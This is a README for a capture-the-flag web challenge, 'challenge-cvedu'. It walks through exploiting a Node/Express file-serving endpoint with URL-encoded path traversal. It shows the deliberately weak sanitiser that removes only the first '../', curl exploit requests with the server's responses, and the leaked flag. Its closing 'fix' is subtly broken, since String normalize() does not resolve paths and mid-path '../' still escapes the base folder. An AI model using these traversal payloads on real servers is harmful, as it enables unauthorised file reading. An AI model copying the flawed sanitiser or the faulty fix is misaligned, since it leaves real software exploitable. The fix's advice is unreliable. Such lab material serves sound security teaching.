# challenge-cvedu

This challenge is about secure file access and injection of special chars in paths.

You are presented with an online code editor for computer vision. The editor allows Visual Programming, where every blocks represents a pure function. You are able to connect every block input and outputs with dragging.

![blocks](blocks.png)

When selecting (by clicking) a block you are able to edit its Typescript code using the embedded Monaco editor. Once you select the play button it will compile the code and run it in the selected block.

![code](code.png)

The goal of a normal user is to write the missing parts of the block's code, building a chroma key algorithm.

If the user gets stuck he's able to click the *SOLUTION* button, that completes the missing parts of the code, giving the intended solution. This functionality is protected by a password, that is expected to be given to the student by the teacher. To prevent a user from guessing the password (in the security challenge context) it is generated from a random source.

The challenge that a user has to face is retrieve the solutions for the blocks code, without knowing the password. Once the user reads the solutions he will found the flag as a comment in the code.

## Project Structure

The project is managed using Lerna workspaces and is divided as following:

- `packages/backend`: The code for the backend, written for Node.JS using Express
- `packages/common`: Types and common code for the backend and the frontend
- `packages/frontend`: The code for the frontend, build using create-react-app

When in production mode the Express app server the static files for the React App.

## Instructions

For __development__ it's possible to use the live reload feature, using the `yarn dev` script.

For __production__ it's suggested to use Docker:

```bash
docker build -t challenge-cvedu .
docker run -p8080:8080 challenge-cvedu
```

This will start the server and expose the pages on port 8080.

### WARNING: Usage behind a reverse proxy

This challenge is based on exploiting url-encoded paths. Therefore it relies on having the url passed as there are to the backend.
I have noticed that, under some type of configurations, reverse proxies like Nginx are escaping urls before sending it to the target server. This makes the challenge unsolvable. Please make sure that the server is NOT url decoding the urls.

In Nginx, for example, it's necessary to omit the trailing slash from the `proxy_pass` rule.

## Exploit

When inspecting the request made by the client to the backend we can gain some insights about the interactions. There are XHR calls to three endpoints:

- `GET /templates`: retrieves all the blocks configuration
- `GET /codes/:type`:  called for each block, retrieves the template code for that block
- `POST /solutions/:type`: called when entering a solution password, tries to get the solution, returns 403 with wrong password

![requests](requests.png)

The big assumption that we have to make is about how the data is retrieved inside the server:

- If we have some kind of __database__ we may attack using SQL Injection
  - *We quickly rule out this hypothesis, since injecting any SQL string does not yields any effect*
- If the developer was lazy enough we may think that he's __reading files__ directly from the disk, using the files API.
  - If this is the case, we know that it's a pretty common mistake to not check the paths that we are reading properly.
  - Since we have endpoints for codes and solutions, we assume two directories at the same level with the same names.

Since it requires no password, we can try to exploit the `GET /template/:type/code` HTTP command. We try with a simple path traversal:

```bash
curl http://localhost:8080/codes/../solutions/ChromaComposite

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /solutions/ChromaComposite</pre>
</body>
</html>
```

With this response we realize that our `../` gets parsed by the application server router, so we need to urlescape it:

```bash
curl http://localhost:8080/codes/..%2Fsolutions%2FChromaComposite

{"status":"error","error":"Error: No code found in path \"/Users/giuliozausa/personal/programming/challenge-cvedu/packages/backend/codes/solutions/ChromaComposite.ts\". Were you trying to perform a path traversal? We got path sanification."}
```

The server replies with an error: the file could not be found. This is because the server has some form of input sanification. Since we have the path readt from the error message, we can use it as an oracle to test how the sanification works.

We quickly understand that the server is only removing the first occurrence `../`. This is a common mistake when using the JavaScript string API:

```js
// Removes path traversal
if (name.includes("../")) {
  name = name.replace("../", "");
}

const filePath = path.join(__dirname, basePath + `${folder}/`, name + ".ts");
```

The `replace("../", "")` function does not removes all the occurrencies, only the first one! We can exploit this behaviour using a double `../` in the start of path. This works even if we use the expected Node.JS `path` api.

```bash
curl http://localhost:8080/codes/..%2F..%2Fsolutions%2FChromaComposite
```

This command will succesfully read the desidered file, leaking the solution, with the challenge flag as reward:

```json
{"status":"ok","data":"// Enjoy your green screen!\n// Flag: DOTDOTSLASH-GOES-BRRR\n\nfunction ChromaComposite({\n  Mask,\n  FrameA,\n  FrameB,\n}: {\n  Mask: { data: boolean[]; width: number; height: number };\n  FrameA: ImageData;\n  FrameB: ImageData;\n}): { Frame: ImageData } {\n  // Copia i pixel dell'immagine\n  const newData = new ImageData(FrameA.width, FrameA.height);\n\n  for (let i = 0; i < FrameA.data.length; i += 4) {\n    if (Mask.data[i / 4]) {\n      newData.data[i] = FrameA.data[i];\n      newData.data[i + 1] = FrameA.data[i + 1];\n      newData.data[i + 2] = FrameA.data[i + 2];\n    } else {\n      newData.data[i] = FrameB.data[i];\n      newData.data[i + 1] = FrameB.data[i + 1];\n      newData.data[i + 2] = FrameB.data[i + 2];\n    }\n\n    newData.data[i + 3] = 255;\n  }\n\n  return { Frame: newData };\n}\n"}
```

## Fixing the vulnerability

There are many ways to fix this vulnerability. The most common is to sanitize the path using a base path that should not be escaped:

```js
function sanitizePath(base, str) {
  // normalize() removes the ../ in the middle, then we remove any ../ from the front of the path
  const normalized = str.normalize().replace(/^(\.\.(\/|\\|$))+/, '');
  // we join the two paths
  return path.join(base, normalized);
}
```
